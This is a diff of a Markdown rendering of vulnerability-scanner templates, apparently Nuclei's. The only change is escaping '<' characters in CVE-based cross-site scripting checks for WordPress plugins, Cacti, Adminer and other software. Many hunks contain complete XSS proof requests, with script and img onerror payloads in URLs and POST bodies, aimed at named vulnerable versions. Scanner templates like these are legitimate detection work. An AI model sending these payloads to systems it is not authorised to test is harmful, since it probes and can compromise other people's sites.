@@ -9554,7 +9554,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <SVG ONLOAD=&#97&#108&#101&#114&#116(&#X64&#X6F&#X63&#X75&#X6D&#X65&#X6E&#X74&#X2E&#X64&#X6F&#X6D&#X61&#X69&#X6E)>
+    1. \<SVG ONLOAD=&#97&#108&#101&#114&#116(&#X64&#X6F&#X63&#X75&#X6D&#X65&#X6E&#X74&#X2E&#X64&#X6F&#X6D&#X61&#X69&#X6E)>
     2. SAPIKS2
 - condition - and
 
@@ -9583,7 +9583,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <title>Telnet </title><script>alert(document.domain)</script><title></title>
+    1. \<title>Telnet \</title>\<script>alert(document.domain)\</script>\<title>\</title>
 
 **Type - word**
 - part - header
@@ -9612,7 +9612,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -9655,13 +9655,13 @@ Host: {{Hostname}}
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/Forms/rpAuth_1?id=</form><iMg%20src=x%20onerror="prompt(document.domain)"><form>
+- {{BaseURL}}/Forms/rpAuth_1?id=\</form>\<iMg%20src=x%20onerror="prompt(document.domain)">\<form>
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. <iMg src=x onerror="prompt(document.domain)"><form>
+    1. \<iMg src=x onerror="prompt(document.domain)">\<form>
     2. Entry Error
 - condition - and
 
@@ -9677,7 +9677,7 @@ Host: {{Hostname}}
 ---
 # Cacti - Cross-Site Scripting
 ## Description
-- Cacti contains a cross-site scripting vulnerability via "http://<CACTI_SERVER>/auth_changepassword.php?ref=<script>alert(1)</script>" which can successfully execute the JavaScript payload present in the "ref" URL parameter.
+- Cacti contains a cross-site scripting vulnerability via "http://\<CACTI_SERVER>/auth_changepassword.php?ref=\<script>alert(1)\</script>" which can successfully execute the JavaScript payload present in the "ref" URL parameter.
 - severity - medium
 - tags - cve,cve2021,cacti,xss
 ## Requests
@@ -9689,7 +9689,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. "></script><script>alert(document.domain)</script>
+    1. ">\</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -9715,7 +9715,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - status**
 - status
@@ -9727,7 +9727,7 @@ Host: {{Hostname}}
     1. text/html
 
 ---
-# WordPress Under Construction <1.19 - Cross-Site Scripting
+# WordPress Under Construction \<1.19 - Cross-Site Scripting
 ## Description
 - WordPress Under Construction plugin before 1.19 contains a cross-site scripting vulnerability. The plugin echoes out the raw value of `$GLOBALS['PHP_SELF']` in the ucOptions.php file on certain configurations, including Apache+modPHP.
 
@@ -9745,7 +9745,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In
 ```
 ### Step - 2
 ```
-GET /wp-admin/admin.php/"><script>alert(document.domain)</script>/?page=under-construction HTTP/1.1
+GET /wp-admin/admin.php/">\<script>alert(document.domain)\</script>/?page=under-construction HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -9754,7 +9754,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. action="/wp-admin/admin.php/"><script>alert(document.domain)</script>
+    1. action="/wp-admin/admin.php/">\<script>alert(document.domain)\</script>
     2. under-construction
 - condition - and
 
@@ -9790,11 +9790,11 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 ---
-# WordPress Mediumish Theme <=1.0.47 - Cross-Site Scripting
+# WordPress Mediumish Theme \<=1.0.47 - Cross-Site Scripting
 ## Description
 - WordPress Mediumish theme 1.0.47 and prior contains an unauthenticated reflected cross-site scripting vulnerability. The 's' GET parameter is not properly sanitized by the search feature before it is output back on the page.
 - severity - medium
@@ -9811,7 +9811,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. <script>alert(/{{randstr}}/)</script>
+    1. \<script>alert(/{{randstr}}/)\</script>
     2. Sorry, no posts matched your criteria.
 - part - body
 - condition - and
@@ -9822,7 +9822,7 @@ Host: {{Hostname}}
 - part - header
 
 ---
-# WordPress Super Socializer <7.13.30 - Cross-Site Scripting
+# WordPress Super Socializer \<7.13.30 - Cross-Site Scripting
 ## Description
 - WordPress Super Socializer plugin before 7.13.30 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape the urls parameter in its the_champ_sharing_count AJAX action (available to both unauthenticated and authenticated users) before outputting it back in the response.
 - severity - medium
@@ -9830,13 +9830,13 @@ Host: {{Hostname}}
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/wp-admin/admin-ajax.php?action=the_champ_sharing_count&urls[]=<img%20src=x%20onerror=alert(document.domain)>
+- {{BaseURL}}/wp-admin/admin-ajax.php?action=the_champ_sharing_count&urls[]=\<img%20src=x%20onerror=alert(document.domain)>
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. {"facebook_urls":[["<img src=x onerror=alert(document.domain)>"]]
+    1. {"facebook_urls":[["\<img src=x onerror=alert(document.domain)>"]]
 
 **Type - word**
 - part - header
@@ -9848,7 +9848,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# The Code Snippets WordPress Plugin < 2.14.3 - Cross-Site Scripting
+# The Code Snippets WordPress Plugin \< 2.14.3 - Cross-Site Scripting
 ## Description
 - The Wordpress plugin Code Snippets before 2.14.3 does not escape the snippets-safe-mode parameter before reflecting it in attributes, leading to a reflected cross-site scripting issue.
 - severity - medium
@@ -9919,7 +9919,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Domain Check <1.0.17 - Cross-Site Scripting
+# WordPress Domain Check \<1.0.17 - Cross-Site Scripting
 ## Description
 - WordPress Domain Check plugin before 1.0.17 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape the domain parameter before outputting it back in the page.
 - severity - medium
@@ -9938,7 +9938,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
 ```
 ### Step - 2
 ```
-GET /wp-admin/admin.php?page=domain-check-profile&domain=test.foo<script>alert(document.domain)</script> HTTP/1.1
+GET /wp-admin/admin.php?page=domain-check-profile&domain=test.foo\<script>alert(document.domain)\</script> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -9947,7 +9947,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script>
+    1. \<script>alert(document.domain)\</script>
     2. Domain Check
 - condition - and
 
@@ -9956,7 +9956,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# Erxes <0.23.0 - Cross-Site Scripting
+# Erxes \<0.23.0 - Cross-Site Scripting
 ## Description
 - Erxes before 0.23.0 contains a cross-site scripting vulnerability. The value of topicID parameter is not escaped and is triggered in the enclosing script tag.
 - severity - medium
@@ -9970,7 +9970,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. topic_id: "</script><script>alert(document.domain)</script>
+    1. topic_id: "\</script>\<script>alert(document.domain)\</script>
     2. window.erxesEnv
 - condition - and
 
@@ -9984,7 +9984,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress FeedWordPress < 2022.0123 - Authenticated Cross-Site Scripting
+# WordPress FeedWordPress \< 2022.0123 - Authenticated Cross-Site Scripting
 ## Description
 - The plugin is affected by a cross-site scripting vulnerability within the "visibility" parameter.
 
@@ -10013,7 +10013,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <img src=1 onerror=alert(document.domain)>
+    1. \<img src=1 onerror=alert(document.domain)>
 
 **Type - word**
 - part - header
@@ -10044,7 +10044,7 @@ username=%3Cimg%2Fsrc%2Fonerror%3Dalert%28document.domain%29%3E&password=test
 
 **Type - word**
 - words
-    1. <img/src/onerror=alert(document.domain)>
+    1. \<img/src/onerror=alert(document.domain)>
     2. java.util.HashMap
 - condition - and
 
@@ -10090,7 +10090,7 @@ Host: {{Hostname}}
 - dsl
     1. contains(all_headers_3, 'text/html')
     2. status_code_3 == 200
-    3. contains(body_3, "<td>\"><script>alert(document.domain)</script></td>")
+    3. contains(body_3, "\<td>\">\<script>alert(document.domain)\</script>\</td>")
 - condition - and
 
 ---
@@ -10123,14 +10123,14 @@ sec=requestpass&email=test%40test.com%22%3e%3cimg%20src%3da%20onerror%3dalert(do
 **Type - word**
 - part - body
 - words
-    1. <img src=a onerror=alert(document.domain)>
+    1. \<img src=a onerror=alert(document.domain)>
     2. seopanel
 - condition - and
 
 ---
-# WordPress Sassy Social Share Plugin <3.3.40 - Cross-Site Scripting
+# WordPress Sassy Social Share Plugin \<3.3.40 - Cross-Site Scripting
 ## Description
-- WordPress plugin Sassy Social Share < 3.3.40 contains a reflected cross-site scripting vulnerability.
+- WordPress plugin Sassy Social Share \< 3.3.40 contains a reflected cross-site scripting vulnerability.
 - severity - medium
 - tags - cve,cve2021,wordpress,wp-plugin,xss,wp,wpscan
 ## Requests
@@ -10143,7 +10143,7 @@ sec=requestpass&email=test%40test.com%22%3e%3cimg%20src%3da%20onerror%3dalert(do
 **Type - word**
 - part - body
 - words
-    1. ?a"><script>alert(document.domain)</script>
+    1. ?a">\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -10166,7 +10166,7 @@ sec=requestpass&email=test%40test.com%22%3e%3cimg%20src%3da%20onerror%3dalert(do
 ---
 # Tiny Java Web Server - Cross-Site Scripting
 ## Description
-- A reflected cross-site scripting vulnerability in the web server TTiny Java Web Server and Servlet Container (TJWS) <=1.115 allows an adversary to inject malicious code on the server's "404 Page not Found" error page.
+- A reflected cross-site scripting vulnerability in the web server TTiny Java Web Server and Servlet Container (TJWS) \<=1.115 allows an adversary to inject malicious code on the server's "404 Page not Found" error page.
 - severity - medium
 - tags - cve,cve2021,xss,tjws,java,seclists
 ## Requests
@@ -10182,7 +10182,7 @@ sec=requestpass&email=test%40test.com%22%3e%3cimg%20src%3da%20onerror%3dalert(do
 **Type - word**
 - part - body
 - words
-    1. <H2>404 te<img src=x onerror=alert(42)>st not found</H2>
+    1. \<H2>404 te\<img src=x onerror=alert(42)>st not found\</H2>
 
 **Type - word**
 - part - header
@@ -10204,7 +10204,7 @@ sec=requestpass&email=test%40test.com%22%3e%3cimg%20src%3da%20onerror%3dalert(do
 
 **Type - word**
 - words
-    1. '></script><script>alert(document.domain)</script>
+    1. '>\</script>\<script>alert(document.domain)\</script>
     2. Thruk Monitoring
 - condition - and
 
@@ -10213,7 +10213,7 @@ sec=requestpass&email=test%40test.com%22%3e%3cimg%20src%3da%20onerror%3dalert(do
     1. 401
 
 ---
-# WordPress FoodBakery <2.2 - Cross-Site Scripting
+# WordPress FoodBakery \<2.2 - Cross-Site Scripting
 ## Description
 - WordPress FoodBakery before 2.2 contains an unauthenticated reflected cross-site scripting vulnerability. It does not properly sanitize the foodbakery_radius parameter before outputting it back in the response.
 - severity - medium
@@ -10226,7 +10226,7 @@ sec=requestpass&email=test%40test.com%22%3e%3cimg%20src%3da%20onerror%3dalert(do
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -10276,7 +10276,7 @@ Host: {{Hostname}}
 - dsl
     1. contains(all_headers_3, 'text/html')
     2. status_code_3 == 200
-    3. contains(body_3, "<td>\"><script>alert(document.domain)</script></td>")
+    3. contains(body_3, "\<td>\">\<script>alert(document.domain)\</script>\</td>")
 - condition - and
 
 ---
@@ -10293,7 +10293,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </title><script>alert('{{randstr}}')</script>
+    1. \</title>\<script>alert('{{randstr}}')\</script>
 
 **Type - word**
 - part - header
@@ -10305,7 +10305,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Calendar Event Multi View <1.4.01 - Cross-Site Scripting
+# WordPress Calendar Event Multi View \<1.4.01 - Cross-Site Scripting
 ## Description
 - WordPress Calendar Event Multi View plugin before 1.4.01 contains an unauthenticated reflected cross-site scripting vulnerability. It does not sanitize or escape the 'start' and 'end' GET parameters before outputting them in the page (via php/edit.php).
 - severity - medium
@@ -10324,7 +10324,7 @@ Connection: close
 
 **Type - word**
 - words
-    1. ><svg/onload=alert(1)><
+    1. >\<svg/onload=alert(1)>\<
     2. Calendar Details
 - part - body
 - condition - and
@@ -10367,7 +10367,7 @@ Connection: close
     1. 200
 
 ---
-# WordPress JH 404 Logger <=1.1 - Cross-Site Scripting
+# WordPress JH 404 Logger \<=1.1 - Cross-Site Scripting
 ## Description
 - WordPress JH 404 Logger plugin through 1.1 contains a cross-site scripting vulnerability. Referer and path of 404 pages are not properly sanitized when they are output in the WordPress dashboard, which can lead to executing arbitrary JavaScript code.
 - severity - medium
@@ -10401,7 +10401,7 @@ Connection: close
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -10422,13 +10422,13 @@ Connection: close
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/wp-admin/admin-ajax.php?action=woof_draw_products&woof_redraw_elements[]=<img%20src=x%20onerror=alert(document.domain)>
+- {{BaseURL}}/wp-admin/admin-ajax.php?action=woof_draw_products&woof_redraw_elements[]=\<img%20src=x%20onerror=alert(document.domain)>
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. "additional_fields":["<img src=x onerror=alert(document.domain)>"]}
+    1. "additional_fields":["\<img src=x onerror=alert(document.domain)>"]}
 
 **Type - word**
 - part - header
@@ -10457,7 +10457,7 @@ Connection: close
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script>" does not exist
+    1. \<script>alert(document.domain)\</script>" does not exist
 
 **Type - word**
 - part - header
@@ -10471,7 +10471,7 @@ Connection: close
 - condition - or
 
 ---
-# BeyondTrust Secure Remote Access Base <=6.0.1 - Cross-Site Scripting
+# BeyondTrust Secure Remote Access Base \<=6.0.1 - Cross-Site Scripting
 ## Description
 - BeyondTrust Secure Remote Access Base through 6.0.1 contains a cross-site scripting vulnerability which allows remote attackers to inject arbitrary web script or HTML.
 - severity - medium
@@ -10486,7 +10486,7 @@ Connection: close
 - case-insensitive - True
 - part - body
 - words
-    1. <svg/onload=alert(document.domain)>
+    1. \<svg/onload=alert(document.domain)>
     2. bomgar
 - condition - and
 
@@ -10495,7 +10495,7 @@ Connection: close
     1. 200
 
 ---
-# WordPress Simple Giveaways <2.36.2 - Cross-Site Scripting
+# WordPress Simple Giveaways \<2.36.2 - Cross-Site Scripting
 ## Description
 - WordPress Simple Giveaways plugin before 2.36.2 contains a cross-site scripting vulnerability via the method and share GET parameters of the Giveaway pages, which are not sanitized, validated, or escaped before being output back in the pages.
 
@@ -10509,7 +10509,7 @@ Connection: close
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -10536,7 +10536,7 @@ Connection: close
 **Type - word**
 - part - body
 - words
-    1. ""></script><script>alert(document.domain)</script>
+    1. "">\</script>\<script>alert(document.domain)\</script>
 - condition - and
 
 **Type - word**
@@ -10549,7 +10549,7 @@ Connection: close
     1. 200
 
 ---
-# Sidekiq <=6.2.0 - Cross-Site Scripting
+# Sidekiq \<=6.2.0 - Cross-Site Scripting
 ## Description
 - Sidekiq through 5.1.3 and 6.x through 6.2.0 contains a cross-site scripting vulnerability via the queue name of the live-poll feature when Internet Explorer is used.
 - severity - medium
@@ -10575,7 +10575,7 @@ Connection: close
     1. 200
 
 ---
-# WordPress Stop Spammers <2021.9 - Cross-Site Scripting
+# WordPress Stop Spammers \<2021.9 - Cross-Site Scripting
 ## Description
 - WordPress Stop Spammers plugin before 2021.9 contains a reflected cross-site scripting vulnerability. It does not escape user input when blocking requests (such as matching a spam word), thus outputting it in an attribute after sanitizing it to remove HTML tags.
 - severity - medium
@@ -10608,7 +10608,7 @@ log=ad%22+accesskey%3DX+onclick%3Dalert%281%29+%22&pwd=&wp-submit=%D9%88%D8%B1%D
     1. ad" accesskey=X onclick=alert(1)
 
 ---
-# WordPress WHMCS Bridge <6.4b - Cross-Site Scripting
+# WordPress WHMCS Bridge \<6.4b - Cross-Site Scripting
 ## Description
 - WordPress WHMCS Bridge plugin before 6.4b contains a reflected cross-site scripting vulnerability. It does not sanitize and escape the error parameter before outputting it back in the admin dashboard.
 
@@ -10637,7 +10637,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <strong><img src onerror=alert(document.domain)></strong>
+    1. \<strong>\<img src onerror=alert(document.domain)>\</strong>
 
 **Type - word**
 - part - header
@@ -10665,7 +10665,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -10692,7 +10692,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -10717,12 +10717,12 @@ Host: {{Hostname}}
 
 **Type - dsl**
 - dsl
-    1. (body == "false <script>alert(document.domain)</script>")
+    1. (body == "false \<script>alert(document.domain)\</script>")
     2. status_code == 200
 - condition - and
 
 ---
-# WordPress Bello Directory & Listing Theme <1.6.0 - Cross-Site Scripting
+# WordPress Bello Directory & Listing Theme \<1.6.0 - Cross-Site Scripting
 ## Description
 - WordPress Bello Directory & Listing theme before 1.6.0 contains a reflected cross-site scripting vulnerability. It does not properly sanitize and escape the listing_list_view, bt_bb_listing_field_my_lat, bt_bb_listing_field_my_lng, bt_bb_listing_field_distance_value, bt_bb_listing_field_my_lat_default, bt_bb_listing_field_keyword, bt_bb_listing_field_location_autocomplete, bt_bb_listing_field_price_range_from and bt_bb_listing_field_price_range_to parameters in the ints listing page.
 - severity - medium
@@ -10735,7 +10735,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -10785,11 +10785,11 @@ Host: {{Hostname}}
 - dsl
     1. contains(all_headers_3, 'text/html')
     2. status_code_3 == 200
-    3. contains(body_3, "Administrator\"><script>alert(document.domain)</script> Admin")
+    3. contains(body_3, "Administrator\">\<script>alert(document.domain)\</script> Admin")
 - condition - and
 
 ---
-# Accela Civic Platform <=21.1 - Cross-Site Scripting
+# Accela Civic Platform \<=21.1 - Cross-Site Scripting
 ## Description
 - Accela Civic Platform through 21.1 contains a cross-site scripting vulnerability via  ssoAdapter/logoutAction.do successURL.
 - severity - medium
@@ -10806,7 +10806,7 @@ Host: {{Hostname}}
 - part - header
 
 ---
-# Customize Login Image < 3.5.3 - Cross-Site Scripting
+# Customize Login Image \< 3.5.3 - Cross-Site Scripting
 ## Description
 - A cross-site scripting (XSS) attack can cause arbitrary code (JavaScript) to run in a user's browser and can use an application as the vehicle for the attack. The XSS payload given in the "Custom logo link" executes whenever the user opens the Settings Page of the "Customize Login Image" Plugin.
 
@@ -10834,7 +10834,7 @@ POST /wp-admin/options.php HTTP/1.1
 Host: {{Hostname}}
 Content-Type: application/x-www-form-urlencoded
 
-option_page=customize-login-image-settings-group&action=update&_wpnonce={{nonce}}&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Foptions-general.php%3Fpage%3Dcustomize-login-image%252Fcustomize-login-image-options.php%26settings-updated%3Dtrue&cli_logo_url=<script>alert(document.domain)</script>&cli_logo_file=&cli_login_background_color=&cli_custom_css=
+option_page=customize-login-image-settings-group&action=update&_wpnonce={{nonce}}&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Foptions-general.php%3Fpage%3Dcustomize-login-image%252Fcustomize-login-image-options.php%26settings-updated%3Dtrue&cli_logo_url=\<script>alert(document.domain)\</script>&cli_logo_file=&cli_login_background_color=&cli_custom_css=
 
 ```
 ### Step - 4
@@ -10849,7 +10849,7 @@ Host: {{Hostname}}
 - dsl
     1. status_code_4 == 200
     2. contains(all_headers_4, "text/html")
-    3. contains(body_4, "Go to <script>alert(document.domain)</script>")
+    3. contains(body_4, "Go to \<script>alert(document.domain)\</script>")
 - condition - and
 ### Extractors
 
@@ -10862,7 +10862,7 @@ Host: {{Hostname}}
 - internal - True
 
 ---
-# Adminer <=4.8.0 - Cross-Site Scripting
+# Adminer \<=4.8.0 - Cross-Site Scripting
 ## Description
 - Adminer 4.6.1 to 4.8.0 contains a cross-site scripting vulnerability which affects users of MySQL, MariaDB, PgSQL, and SQLite in browsers without CSP when Adminer uses a `pdo_` extension to communicate with the database (it is used if the native extensions are not enabled).
 - severity - medium
@@ -10875,7 +10875,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -10902,7 +10902,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -10929,7 +10929,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. please click <a href="javascript://%0aalert(document.domain)" target="_self">
+    1. please click \<a href="javascript://%0aalert(document.domain)" target="_self">
 
 **Type - word**
 - part - header
@@ -10941,7 +10941,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Photo Gallery by 10Web <1.5.69 - Cross-Site Scripting
+# WordPress Photo Gallery by 10Web \<1.5.69 - Cross-Site Scripting
 ## Description
 - WordPress Photo Gallery by 10Web plugin before 1.5.69 contains multiple reflected cross-site scripting vulnerabilities via the gallery_id, tag, album_id and theme_id GET parameters passed to the bwg_frontend_data AJAX action, available to both unauthenticated and authenticated users.
 
@@ -10969,7 +10969,7 @@ Host: {{Hostname}}
 - condition - and
 
 ---
-# WordPress Car Repair Services & Auto Mechanic Theme <4.0 - Cross-Site Scripting
+# WordPress Car Repair Services & Auto Mechanic Theme \<4.0 - Cross-Site Scripting
 ## Description
 - WordPress Car Repair Services & Auto Mechanic before 4.0 contains a reflected cross-site scripting vulnerability. It does not properly sanitize the serviceestimatekey parameter before outputting it back in the page.
 - severity - medium
@@ -10982,7 +10982,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -10995,7 +10995,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress JNews Theme <8.0.6 - Cross-Site Scripting
+# WordPress JNews Theme \<8.0.6 - Cross-Site Scripting
 ## Description
 - WordPress JNews theme before 8.0.6 contains a reflected cross-site scripting vulnerability. It does not sanitize the cat_id parameter in the POST request /?ajax-request=jnews (with action=jnews_build_mega_category_*).
 - severity - medium
@@ -11008,14 +11008,14 @@ Host: {{Hostname}}
 Accept: */*
 Content-Type: application/x-www-form-urlencoded
 
-lang=en_US&cat_id=6"></script><script>alert(document.domain)</script>&action=jnews_build_mega_category_2&number=6&tags=70%2C64%2C10%2C67
+lang=en_US&cat_id=6">\</script>\<script>alert(document.domain)\</script>&action=jnews_build_mega_category_2&number=6&tags=70%2C64%2C10%2C67
 
 ```
 ### Matchers
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -11028,7 +11028,7 @@ lang=en_US&cat_id=6"></script><script>alert(document.domain)</script>&action=jne
     1. 200
 
 ---
-# WordPress Realteo <=1.2.3 - Cross-Site Scripting
+# WordPress Realteo \<=1.2.3 - Cross-Site Scripting
 ## Description
 - WordPress Realteo plugin 1.2.3 and prior contains an unauthenticated reflected cross-site scripting vulnerability due to improper sanitization of keyword_search, search_radius. _bedrooms and _bathrooms GET parameters before outputting them in its properties page.
 - severity - medium
@@ -11070,7 +11070,7 @@ lang=en_US&cat_id=6"></script><script>alert(document.domain)</script>&action=jne
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -11082,7 +11082,7 @@ lang=en_US&cat_id=6"></script><script>alert(document.domain)</script>&action=jne
     1. 200
 
 ---
-# Zoho ManageEngine ADSelfService Plus <=6103 - Cross-Site Scripting
+# Zoho ManageEngine ADSelfService Plus \<=6103 - Cross-Site Scripting
 ## Description
 - Zoho ManageEngine ADSelfService Plus 6103 and prior contains a reflected cross-site scripting vulnerability on the loadframe page.
 - severity - medium
@@ -11105,7 +11105,7 @@ lang=en_US&cat_id=6"></script><script>alert(document.domain)</script>&action=jne
 **Type - word**
 - part - body
 - words
-    1. ></iframe><script>alert(1)</script>
+    1. >\</iframe>\<script>alert(1)\</script>
     2. adsf/js/
 - condition - and
 
@@ -11151,7 +11151,7 @@ lang=en_US&cat_id=6"></script><script>alert(document.domain)</script>&action=jne
 
 **Type - word**
 - words
-    1. TEST<script>alert(1)</script>
+    1. TEST\<script>alert(1)\</script>
 
 **Type - word**
 - part - header
@@ -11210,13 +11210,13 @@ Content-Type: application/x-www-form-urlencoded
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/mods/clansphere/lang_modvalidate.php?language=language&module=module%22></script><script>alert(document.domain)</script>
+- {{BaseURL}}/mods/clansphere/lang_modvalidate.php?language=language&module=module%22>\</script>\<script>alert(document.domain)\</script>
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. "></script><script>alert(document.domain)</script>.php
+    1. ">\</script>\<script>alert(document.domain)\</script>.php
 
 **Type - word**
 - part - header
@@ -11228,7 +11228,7 @@ Content-Type: application/x-www-form-urlencoded
     1. 200
 
 ---
-# Wordpress Marmoset Viewer <1.9.3 - Cross-Site Scripting
+# Wordpress Marmoset Viewer \<1.9.3 - Cross-Site Scripting
 ## Description
 - WordPress Marmoset Viewer plugin before 1.9.3 contains a cross-site scripting vulnerability. It does not property sanitize, validate, or escape the 'id' parameter before outputting back in the page.
 - severity - medium
@@ -11236,7 +11236,7 @@ Content-Type: application/x-www-form-urlencoded
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/wp-content/plugins/marmoset-viewer/mviewer.php?id=http://</script><svg/onload=alert(%27{{randstr}}%27)>
+- {{BaseURL}}/wp-content/plugins/marmoset-viewer/mviewer.php?id=http://\</script>\<svg/onload=alert(%27{{randstr}}%27)>
 - {{BaseURL}}/wp-content/plugins/marmoset-viewer/mviewer.php?id=1+http://a.com%27);alert(/{{randstr}}/);marmoset.embed(%27a
 ### Matchers
 
@@ -11246,7 +11246,7 @@ Content-Type: application/x-www-form-urlencoded
 
 **Type - word**
 - words
-    1. </script><svg/onload=alert('{{randstr}}')>
+    1. \</script>\<svg/onload=alert('{{randstr}}')>
     2. alert(/{{randstr}}/)
 - part - body
 - condition - or
@@ -11269,7 +11269,7 @@ Content-Type: application/x-www-form-urlencoded
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -11301,7 +11301,7 @@ Content-Type: application/x-www-form-urlencoded
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - condition - and
 
 **Type - word**
@@ -11323,7 +11323,7 @@ Content-Type: application/x-www-form-urlencoded
 
 **Type - word**
 - words
-    1. "</script><script>alert(document.domain)</script>"><input
+    1. "\</script>\<script>alert(document.domain)\</script>">\<input
 - part - body
 
 **Type - word**
@@ -11336,7 +11336,7 @@ Content-Type: application/x-www-form-urlencoded
     1. 200
 
 ---
-# WordPress Checklist <1.1.9 - Cross-Site Scripting
+# WordPress Checklist \<1.1.9 - Cross-Site Scripting
 ## Description
 - WordPress Checklist plugin before 1.1.9 contains a cross-site scripting vulnerability. The fill parameter is not correctly filtered in the checklist-icon.php file.
 - severity - medium
@@ -11349,7 +11349,7 @@ Content-Type: application/x-www-form-urlencoded
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -11362,7 +11362,7 @@ Content-Type: application/x-www-form-urlencoded
     1. 200
 
 ---
-# Visualizer <3.3.1 - Blind Server-Side Request Forgery
+# Visualizer \<3.3.1 - Blind Server-Side Request Forgery
 ## Description
 - Visualizer prior to 3.3.1 suffers from a blind server-side request forgery vulnerability via the /wp-json/visualizer/v1/upload-data endpoint.
 
@@ -11392,7 +11392,7 @@ Content-Type: application/x-www-form-urlencoded
     1. 200
 
 ---
-# WordPress Visualizer <3.3.1 - Cross-Site Scripting
+# WordPress Visualizer \<3.3.1 - Cross-Site Scripting
 ## Description
 - WordPress Visualizer plugin before 3.3.1 contains a stored cross-site scripting vulnerability via /wp-json/visualizer/v1/update-chart WP-JSON API endpoint. An unauthenticated attacker can execute arbitrary JavaScript when an admin or other privileged user edits the chart via the admin dashboard.
 
@@ -11405,7 +11405,7 @@ POST /wp-json/visualizer/v1/update-chart HTTP/1.1
 Host: {{Hostname}}
 Content-Type: application/json
 
-{"id": 7, "visualizer-chart-type": "<script>alert(document.domain)</script>"}
+{"id": 7, "visualizer-chart-type": "\<script>alert(document.domain)\</script>"}
 
 ```
 ### Matchers
